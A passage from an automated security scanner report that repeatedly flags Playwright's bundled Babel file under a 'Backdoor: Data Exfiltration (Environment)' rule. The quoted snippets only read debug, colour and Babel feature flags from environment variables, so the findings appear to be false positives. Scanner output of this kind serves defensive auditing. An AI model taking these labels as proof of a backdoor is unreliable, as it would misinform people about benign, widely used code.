                  "endColumn": 164957,
                  "snippet": {
                    "text": ",165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221])}catch{}Xt.inspectOpts=Object.keys(process.env).filter(e=>/^debug_/i.test(e)).reduce((e,t)=>{let r=t.substring(6).toLowerCase().replace(/_([a-z])/g,(s,i)=>i.toUpperCase()),n=process.env[t];return/^(yes|on|true|enabled)$/i.test(n)?n=!0:/^(no|off|false|disabled)$/i.test(n)?n=!1:n===\"null\"?n=null:n=Number(n),e[r]=n,e},{});function XH(){return\"colors\"in Xt.inspectOpts?!!Xt.inspectOpts.colors:YH.isatty(process.stderr.fd)}function JH(e){let{namespace:t,useColors:r}=this;if(r){let n=this",
                    "rendered": {
                      "text": ",165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221])}catch{}Xt.inspectOpts=Object.keys(process.env).filter(e=>/^debug_/i.test(e)).reduce((e,t)=>{let r=t.substring(6).toLowerCase().replace(/_([a-z])/g,(s,i)=>i.toUpperCase()),n=process.env[t];return/^(yes|on|true|enabled)$/i.test(n)?n=!0:/^(no|off|false|disabled)$/i.test(n)?n=!1:n===\"null\"?n=null:n=Number(n),e[r]=n,e},{});function XH(){return\"colors\"in Xt.inspectOpts?!!Xt.inspectOpts.colors:YH.isatty(process.stderr.fd)}function JH(e){let{namespace:t,useColors:r}=this;if(r){let n=this",
                      "markdown": "`,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221])}catch{}Xt.inspectOpts=Object.keys(process.env).filter(e=>/^debug_/i.test(e)).reduce((e,t)=>{let r=t.substring(6).toLowerCase().replace(/_([a-z])/g,(s,i)=>i.toUpperCase()),n=process.env[t];return/^(yes|on|true|enabled)$/i.test(n)?n=!0:/^(no|off|false|disabled)$/i.test(n)?n=!1:n===\"null\"?n=null:n=Number(n),e[r]=n,e},{});function XH(){return\"colors\"in Xt.inspectOpts?!!Xt.inspectOpts.colors:YH.isatty(process.stderr.fd)}function JH(e){let{namespace:t,useColors:r}=this;if(r){let n=this`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 164807,
                  "endLine": 8,
                  "endColumn": 164818,
                  "snippet": {
                    "text": ",27,32,33,38,39,40,41,42,43,44,45,56,57,62,63,68,69,74,75,76,77,78,79,80,81,92,93,98,99,112,113,128,129,134,135,148,149,160,161,162,163,164,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221])}catch{}Xt.inspectOpts=Object.keys(process.env).filter(e=>/^debug_/i.test(e)).reduce((e,t)=>{let r=t.substring(6).toLowerCase().replace(/_([a-z])/g,(s,i)=>i.toUpperCase()),n=process.env[t];return/^(yes|on|true|enabled)$/i.test(n)?n=!0:/^(no|off|false|disabled)$/i.test(n)?n=!1:n===\"null\"?n=null:n=Number(n),e[r]=n,e},{});function XH(){return\"colo",
                    "rendered": {
                      "text": ",27,32,33,38,39,40,41,42,43,44,45,56,57,62,63,68,69,74,75,76,77,78,79,80,81,92,93,98,99,112,113,128,129,134,135,148,149,160,161,162,163,164,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221])}catch{}Xt.inspectOpts=Object.keys(process.env).filter(e=>/^debug_/i.test(e)).reduce((e,t)=>{let r=t.substring(6).toLowerCase().replace(/_([a-z])/g,(s,i)=>i.toUpperCase()),n=process.env[t];return/^(yes|on|true|enabled)$/i.test(n)?n=!0:/^(no|off|false|disabled)$/i.test(n)?n=!1:n===\"null\"?n=null:n=Number(n),e[r]=n,e},{});function XH(){return\"colo",
                      "markdown": "`,27,32,33,38,39,40,41,42,43,44,45,56,57,62,63,68,69,74,75,76,77,78,79,80,81,92,93,98,99,112,113,128,129,134,135,148,149,160,161,162,163,164,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221])}catch{}Xt.inspectOpts=Object.keys(process.env).filter(e=>/^debug_/i.test(e)).reduce((e,t)=>{let r=t.substring(6).toLowerCase().replace(/_([a-z])/g,(s,i)=>i.toUpperCase()),n=process.env[t];return/^(yes|on|true|enabled)$/i.test(n)?n=!0:/^(no|off|false|disabled)$/i.test(n)?n=!1:n===\"null\"?n=null:n=Number(n),e[r]=n,e},{});function XH(){return\"colo`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 162753,
                  "endLine": 8,
                  "endColumn": 162764,
                  "snippet": {
                    "text": "rn\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith(\"-\")?\"\":e.length===1?\"-\":\"--\",n=t.indexOf(r+e),s=t.indexOf(\"--\");return n!==-1&&(s===-1?!0:n<s)}});var rm=E((yCe,oS)=>{\"use strict\";var KH=require(\"os\"),Yr=aS(),Zt=process.env,Mi;Yr(\"no-color\")||Yr(\"no-colors\")||Yr(\"color=false\")?Mi=!1:(Yr(\"color\")||Yr(\"colors\")||Yr(\"color=true\")||Yr(\"color=always\"))&&(Mi=!0);\"FORCE_COLOR\"in Zt&&(Mi=Zt.FORCE_COLOR.length===0||parseInt(Zt.FORCE_COLOR,10)!==0);function GH(e){return e===0?!1:{level:e,hasBasic:!0,has256:e>=2,has16m:e>=3}}fun",
                    "rendered": {
                      "text": "rn\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith(\"-\")?\"\":e.length===1?\"-\":\"--\",n=t.indexOf(r+e),s=t.indexOf(\"--\");return n!==-1&&(s===-1?!0:n<s)}});var rm=E((yCe,oS)=>{\"use strict\";var KH=require(\"os\"),Yr=aS(),Zt=process.env,Mi;Yr(\"no-color\")||Yr(\"no-colors\")||Yr(\"color=false\")?Mi=!1:(Yr(\"color\")||Yr(\"colors\")||Yr(\"color=true\")||Yr(\"color=always\"))&&(Mi=!0);\"FORCE_COLOR\"in Zt&&(Mi=Zt.FORCE_COLOR.length===0||parseInt(Zt.FORCE_COLOR,10)!==0);function GH(e){return e===0?!1:{level:e,hasBasic:!0,has256:e>=2,has16m:e>=3}}fun",
                      "markdown": "`rn\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith(\"-\")?\"\":e.length===1?\"-\":\"--\",n=t.indexOf(r+e),s=t.indexOf(\"--\");return n!==-1&&(s===-1?!0:n<s)}});var rm=E((yCe,oS)=>{\"use strict\";var KH=require(\"os\"),Yr=aS(),Zt=process.env,Mi;Yr(\"no-color\")||Yr(\"no-colors\")||Yr(\"color=false\")?Mi=!1:(Yr(\"color\")||Yr(\"colors\")||Yr(\"color=true\")||Yr(\"color=always\"))&&(Mi=!0);\"FORCE_COLOR\"in Zt&&(Mi=Zt.FORCE_COLOR.length===0||parseInt(Zt.FORCE_COLOR,10)!==0);function GH(e){return e===0?!1:{level:e,hasBasic:!0,has256:e>=2,has16m:e>=3}}fun`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 162277,
                  "endLine": 8,
                  "endColumn": 162288,
                  "snippet": {
                    "text": "\"%%\"&&(r++,s===\"%c\"&&(n=r))}),e.splice(n,0,t)}wr.log=console.debug||console.log||(()=>{});function UH(e){try{e?wr.storage.setItem(\"debug\",e):wr.storage.removeItem(\"debug\")}catch{}}function VH(){let e;try{e=wr.storage.getItem(\"debug\")}catch{}return!e&&typeof process!=\"undefined\"&&\"env\"in process&&(e=process.env.DEBUG),e}function $H(){try{return localStorage}catch{}}au.exports=em()(wr);var{formatters:WH}=au.exports;WH.j=function(e){try{return JSON.stringify(e)}catch(t){return\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith",
                    "rendered": {
                      "text": "\"%%\"&&(r++,s===\"%c\"&&(n=r))}),e.splice(n,0,t)}wr.log=console.debug||console.log||(()=>{});function UH(e){try{e?wr.storage.setItem(\"debug\",e):wr.storage.removeItem(\"debug\")}catch{}}function VH(){let e;try{e=wr.storage.getItem(\"debug\")}catch{}return!e&&typeof process!=\"undefined\"&&\"env\"in process&&(e=process.env.DEBUG),e}function $H(){try{return localStorage}catch{}}au.exports=em()(wr);var{formatters:WH}=au.exports;WH.j=function(e){try{return JSON.stringify(e)}catch(t){return\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith",
                      "markdown": "`\"%%\"&&(r++,s===\"%c\"&&(n=r))}),e.splice(n,0,t)}wr.log=console.debug||console.log||(()=>{});function UH(e){try{e?wr.storage.setItem(\"debug\",e):wr.storage.removeItem(\"debug\")}catch{}}function VH(){let e;try{e=wr.storage.getItem(\"debug\")}catch{}return!e&&typeof process!=\"undefined\"&&\"env\"in process&&(e=process.env.DEBUG),e}function $H(){try{return localStorage}catch{}}au.exports=em()(wr);var{formatters:WH}=au.exports;WH.j=function(e){try{return JSON.stringify(e)}catch(t){return\"[UnexpectedJSONParseError]: \"+t.message}}});var aS=E((mCe,iS)=>{\"use strict\";iS.exports=(e,t)=>{t=t||process.argv;let r=e.startsWith`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 22745,
                  "endLine": 8,
                  "endColumn": 22756,
                  "snippet": {
                    "text": ".E4.PLACEHOLDERS)}}});Ad(\"V8IntrinsicIdentifier\",{builder:[\"name\"],fields:{name:{validate:(0,$l.assertValueType)(\"string\")}}})});var Ev=E(()=>{\"use strict\";var at=wn();(0,at.default)(\"ArgumentPlaceholder\",{});(0,at.default)(\"BindExpression\",{visitor:[\"object\",\"callee\"],aliases:[\"Expression\"],fields:process.env.BABEL_TYPES_8_BREAKING?{object:{validate:(0,at.assertNodeType)(\"Expression\")},callee:{validate:(0,at.assertNodeType)(\"Expression\")}}:{object:{validate:Object.assign(()=>{},{oneOfNodeTypes:[\"Expression\"]})},callee:{validate:Object.assign(()=>{},{oneOfNodeTypes:[\"Expression\"]})}}});(0,at.default)(\"Im",
                    "rendered": {
                      "text": ".E4.PLACEHOLDERS)}}});Ad(\"V8IntrinsicIdentifier\",{builder:[\"name\"],fields:{name:{validate:(0,$l.assertValueType)(\"string\")}}})});var Ev=E(()=>{\"use strict\";var at=wn();(0,at.default)(\"ArgumentPlaceholder\",{});(0,at.default)(\"BindExpression\",{visitor:[\"object\",\"callee\"],aliases:[\"Expression\"],fields:process.env.BABEL_TYPES_8_BREAKING?{object:{validate:(0,at.assertNodeType)(\"Expression\")},callee:{validate:(0,at.assertNodeType)(\"Expression\")}}:{object:{validate:Object.assign(()=>{},{oneOfNodeTypes:[\"Expression\"]})},callee:{validate:Object.assign(()=>{},{oneOfNodeTypes:[\"Expression\"]})}}});(0,at.default)(\"Im",
                      "markdown": "`.E4.PLACEHOLDERS)}}});Ad(\"V8IntrinsicIdentifier\",{builder:[\"name\"],fields:{name:{validate:(0,$l.assertValueType)(\"string\")}}})});var Ev=E(()=>{\"use strict\";var at=wn();(0,at.default)(\"ArgumentPlaceholder\",{});(0,at.default)(\"BindExpression\",{visitor:[\"object\",\"callee\"],aliases:[\"Expression\"],fields:process.env.BABEL_TYPES_8_BREAKING?{object:{validate:(0,at.assertNodeType)(\"Expression\")},callee:{validate:(0,at.assertNodeType)(\"Expression\")}}:{object:{validate:Object.assign(()=>{},{oneOfNodeTypes:[\"Expression\"]})},callee:{validate:Object.assign(()=>{},{oneOfNodeTypes:[\"Expression\"]})}}});(0,at.default)(\"Im`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 2060,
                  "endLine": 8,
                  "endColumn": 2071,
                  "snippet": {
                    "text": "guments\",\"optional\"],aliases:[\"Expression\"],fields:{callee:{validate:(0,h.assertNodeType)(\"Expression\")},arguments:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Expression\",\"SpreadElement\",\"JSXNamespacedName\",\"ArgumentPlaceholder\")))},optional:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.chain)((0,h.assertValueType)(\"boolean\"),(0,h.assertOptionalChainStart)()):(0,h.assertValueType)(\"boolean\")},typeArguments:{validate:(0,h.assertNodeType)(\"TypeParameterInstantiation\"),optional:!0},typeParameters:{validate:(0,h.assertNodeType)(\"TSTypeParameterInstantiation",
                    "rendered": {
                      "text": "guments\",\"optional\"],aliases:[\"Expression\"],fields:{callee:{validate:(0,h.assertNodeType)(\"Expression\")},arguments:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Expression\",\"SpreadElement\",\"JSXNamespacedName\",\"ArgumentPlaceholder\")))},optional:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.chain)((0,h.assertValueType)(\"boolean\"),(0,h.assertOptionalChainStart)()):(0,h.assertValueType)(\"boolean\")},typeArguments:{validate:(0,h.assertNodeType)(\"TypeParameterInstantiation\"),optional:!0},typeParameters:{validate:(0,h.assertNodeType)(\"TSTypeParameterInstantiation",
                      "markdown": "`guments\",\"optional\"],aliases:[\"Expression\"],fields:{callee:{validate:(0,h.assertNodeType)(\"Expression\")},arguments:{validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)((0,h.assertNodeType)(\"Expression\",\"SpreadElement\",\"JSXNamespacedName\",\"ArgumentPlaceholder\")))},optional:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.chain)((0,h.assertValueType)(\"boolean\"),(0,h.assertOptionalChainStart)()):(0,h.assertValueType)(\"boolean\")},typeArguments:{validate:(0,h.assertNodeType)(\"TypeParameterInstantiation\"),optional:!0},typeParameters:{validate:(0,h.assertNodeType)(\"TSTypeParameterInstantiation`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 1496,
                  "endLine": 8,
                  "endColumn": 1507,
                  "snippet": {
                    "text": "te:(0,h.assertNodeType)(\"Expression\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\"),t=(0,h.assertNodeType)(\"Expression\");return Object.assign(function(n,s,i){(n.computed?t:e)(n,s,i)},{oneOfNodeTypes:[\"Expression\",\"Identifier\"]})}()},computed:{default:!1},optional:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.chain)((0,h.assertValueType)(\"boolean\"),(0,h.assertOptionalChainStart)()):(0,h.assertValueType)(\"boolean\")}}});Q(\"OptionalCallExpression\",{visitor:[\"callee\",\"arguments\",\"typeParameters\",\"typeArguments\"],builder:[\"callee\",\"arguments\",\"optional\"],aliases:[\"Expression\"],fie",
                    "rendered": {
                      "text": "te:(0,h.assertNodeType)(\"Expression\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\"),t=(0,h.assertNodeType)(\"Expression\");return Object.assign(function(n,s,i){(n.computed?t:e)(n,s,i)},{oneOfNodeTypes:[\"Expression\",\"Identifier\"]})}()},computed:{default:!1},optional:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.chain)((0,h.assertValueType)(\"boolean\"),(0,h.assertOptionalChainStart)()):(0,h.assertValueType)(\"boolean\")}}});Q(\"OptionalCallExpression\",{visitor:[\"callee\",\"arguments\",\"typeParameters\",\"typeArguments\"],builder:[\"callee\",\"arguments\",\"optional\"],aliases:[\"Expression\"],fie",
                      "markdown": "`te:(0,h.assertNodeType)(\"Expression\")},property:{validate:function(){let e=(0,h.assertNodeType)(\"Identifier\"),t=(0,h.assertNodeType)(\"Expression\");return Object.assign(function(n,s,i){(n.computed?t:e)(n,s,i)},{oneOfNodeTypes:[\"Expression\",\"Identifier\"]})}()},computed:{default:!1},optional:{validate:process.env.BABEL_TYPES_8_BREAKING?(0,h.chain)((0,h.assertValueType)(\"boolean\"),(0,h.assertOptionalChainStart)()):(0,h.assertValueType)(\"boolean\")}}});Q(\"OptionalCallExpression\",{visitor:[\"callee\",\"arguments\",\"typeParameters\",\"typeArguments\"],builder:[\"callee\",\"arguments\",\"optional\"],aliases:[\"Expression\"],fie`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 284,
                  "endLine": 8,
                  "endColumn": 295,
                  "snippet": {
                    "text": "of expressions.\nExpected ${r.length+1} quasis but got ${e.quasis.length}`)})}}});Q(\"YieldExpression\",{builder:[\"argument\",\"delegate\"],visitor:[\"argument\"],aliases:[\"Expression\",\"Terminatorless\"],fields:{delegate:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!e.argument)throw new TypeError(\"Property delegate of YieldExpression cannot be true if there is no argument\")},{type:\"boolean\"})),default:!1},argument:{optional:!0,validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"AwaitExpression\",{builder:[\"argument\"],visitor:[\"argumen",
                    "rendered": {
                      "text": "of expressions.\nExpected ${r.length+1} quasis but got ${e.quasis.length}`)})}}});Q(\"YieldExpression\",{builder:[\"argument\",\"delegate\"],visitor:[\"argument\"],aliases:[\"Expression\",\"Terminatorless\"],fields:{delegate:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!e.argument)throw new TypeError(\"Property delegate of YieldExpression cannot be true if there is no argument\")},{type:\"boolean\"})),default:!1},argument:{optional:!0,validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"AwaitExpression\",{builder:[\"argument\"],visitor:[\"argumen",
                      "markdown": "`of expressions.\nExpected ${r.length+1} quasis but got ${e.quasis.length}`)})}}});Q(\"YieldExpression\",{builder:[\"argument\",\"delegate\"],visitor:[\"argument\"],aliases:[\"Expression\",\"Terminatorless\"],fields:{delegate:{validate:(0,h.chain)((0,h.assertValueType)(\"boolean\"),Object.assign(function(e,t,r){if(process.env.BABEL_TYPES_8_BREAKING&&r&&!e.argument)throw new TypeError(\"Property delegate of YieldExpression cannot be true if there is no argument\")},{type:\"boolean\"})),default:!1},argument:{optional:!0,validate:(0,h.assertNodeType)(\"Expression\")}}});Q(\"AwaitExpression\",{builder:[\"argument\"],visitor:[\"argumen`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 30862,
                  "endLine": 7,
                  "endColumn": 30873,
                  "snippet": {
                    "text": "r\")},source:{validate:(0,h.assertNodeType)(\"Expression\")},options:{validate:(0,h.assertNodeType)(\"Expression\"),optional:!0}}});Q(\"MetaProperty\",{visitor:[\"meta\",\"property\"],aliases:[\"Expression\"],fields:{meta:{validate:(0,h.chain)((0,h.assertNodeType)(\"Identifier\"),Object.assign(function(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n;switch(r.name){case\"function\":n=\"sent\";break;case\"new\":n=\"target\";break;case\"import\":n=\"meta\";break}if(!(0,ur.default)(\"Identifier\",e.property,{name:n}))throw new TypeError(\"Unrecognised MetaProperty\")},{oneOfNodeTypes:[\"Identifier\"]}))},property:{validate:(0,h.a",
                    "rendered": {
                      "text": "r\")},source:{validate:(0,h.assertNodeType)(\"Expression\")},options:{validate:(0,h.assertNodeType)(\"Expression\"),optional:!0}}});Q(\"MetaProperty\",{visitor:[\"meta\",\"property\"],aliases:[\"Expression\"],fields:{meta:{validate:(0,h.chain)((0,h.assertNodeType)(\"Identifier\"),Object.assign(function(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n;switch(r.name){case\"function\":n=\"sent\";break;case\"new\":n=\"target\";break;case\"import\":n=\"meta\";break}if(!(0,ur.default)(\"Identifier\",e.property,{name:n}))throw new TypeError(\"Unrecognised MetaProperty\")},{oneOfNodeTypes:[\"Identifier\"]}))},property:{validate:(0,h.a",
                      "markdown": "`r\")},source:{validate:(0,h.assertNodeType)(\"Expression\")},options:{validate:(0,h.assertNodeType)(\"Expression\"),optional:!0}}});Q(\"MetaProperty\",{visitor:[\"meta\",\"property\"],aliases:[\"Expression\"],fields:{meta:{validate:(0,h.chain)((0,h.assertNodeType)(\"Identifier\"),Object.assign(function(e,t,r){if(!process.env.BABEL_TYPES_8_BREAKING)return;let n;switch(r.name){case\"function\":n=\"sent\";break;case\"new\":n=\"target\";break;case\"import\":n=\"meta\";break}if(!(0,ur.default)(\"Identifier\",e.property,{name:n}))throw new TypeError(\"Unrecognised MetaProperty\")},{oneOfNodeTypes:[\"Identifier\"]}))},property:{validate:(0,h.a`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 28436,
                  "endLine": 7,
                  "endColumn": 28447,
                  "snippet": {
                    "text": "ier\",\"StringLiteral\")},exportKind:{validate:(0,h.assertOneOf)(\"type\",\"value\"),optional:!0}}});Q(\"ForOfStatement\",{visitor:[\"left\",\"right\",\"body\"],builder:[\"left\",\"right\",\"body\",\"await\"],aliases:[\"Scopable\",\"Statement\",\"For\",\"BlockParent\",\"Loop\",\"ForXStatement\"],fields:{left:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertNodeType)(\"VariableDeclaration\",\"LVal\");let e=(0,h.assertNodeType)(\"VariableDeclaration\"),t=(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\");r",
                    "rendered": {
                      "text": "ier\",\"StringLiteral\")},exportKind:{validate:(0,h.assertOneOf)(\"type\",\"value\"),optional:!0}}});Q(\"ForOfStatement\",{visitor:[\"left\",\"right\",\"body\"],builder:[\"left\",\"right\",\"body\",\"await\"],aliases:[\"Scopable\",\"Statement\",\"For\",\"BlockParent\",\"Loop\",\"ForXStatement\"],fields:{left:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertNodeType)(\"VariableDeclaration\",\"LVal\");let e=(0,h.assertNodeType)(\"VariableDeclaration\"),t=(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\");r",
                      "markdown": "`ier\",\"StringLiteral\")},exportKind:{validate:(0,h.assertOneOf)(\"type\",\"value\"),optional:!0}}});Q(\"ForOfStatement\",{visitor:[\"left\",\"right\",\"body\"],builder:[\"left\",\"right\",\"body\",\"await\"],aliases:[\"Scopable\",\"Statement\",\"For\",\"BlockParent\",\"Loop\",\"ForXStatement\"],fields:{left:{validate:function(){if(!process.env.BABEL_TYPES_8_BREAKING)return(0,h.assertNodeType)(\"VariableDeclaration\",\"LVal\");let e=(0,h.assertNodeType)(\"VariableDeclaration\"),t=(0,h.assertNodeType)(\"Identifier\",\"MemberExpression\",\"ArrayPattern\",\"ObjectPattern\",\"TSAsExpression\",\"TSSatisfiesExpression\",\"TSTypeAssertion\",\"TSNonNullExpression\");r`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 27728,
                  "endLine": 7,
                  "endColumn": 27739,
                  "snippet": {
                    "text": "tEach)((0,h.assertNodeType)(\"ImportAttribute\")))},specifiers:{default:[],validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)(function(){let e=(0,h.assertNodeType)(\"ExportSpecifier\",\"ExportDefaultSpecifier\",\"ExportNamespaceSpecifier\"),t=(0,h.assertNodeType)(\"ExportSpecifier\");return process.env.BABEL_TYPES_8_BREAKING?function(r,n,s){(r.source?e:t)(r,n,s)}:e}()))},source:{validate:(0,h.assertNodeType)(\"StringLiteral\"),optional:!0},exportKind:(0,h.validateOptional)((0,h.assertOneOf)(\"type\",\"value\"))}});Q(\"ExportSpecifier\",{visitor:[\"local\",\"exported\"],aliases:[\"ModuleSpecifier\"],fields:{loc",
                    "rendered": {
                      "text": "tEach)((0,h.assertNodeType)(\"ImportAttribute\")))},specifiers:{default:[],validate:(0,h.chain)((0,h.assertValueType)(\"array\"),(0,h.assertEach)(function(){let e=(0,h.assertNodeType)(\"ExportSpecifier\",\"ExportDefaultSpecifier\",\"ExportNamespaceSpecifier\"),t=(0,h.assertNodeType)(\"ExportSpecifier\");return process.env.BABEL_TYPES_8_BREAKING?function(r,n,s){(r.source?e:t)(r,n,s)}:e}()))},source:{validate:(0,h.assertNodeType)(\"StringLiteral\"),optional:!0},exportKind:(0,h.validateOptional)((0,h.assertOneOf)(\"type\",\"value\"))}});Q(\"ExportSpecifier\",{visitor:[\"local\",\"exported\"],aliases:[\"ModuleSpecifier\"],fields:{loc",
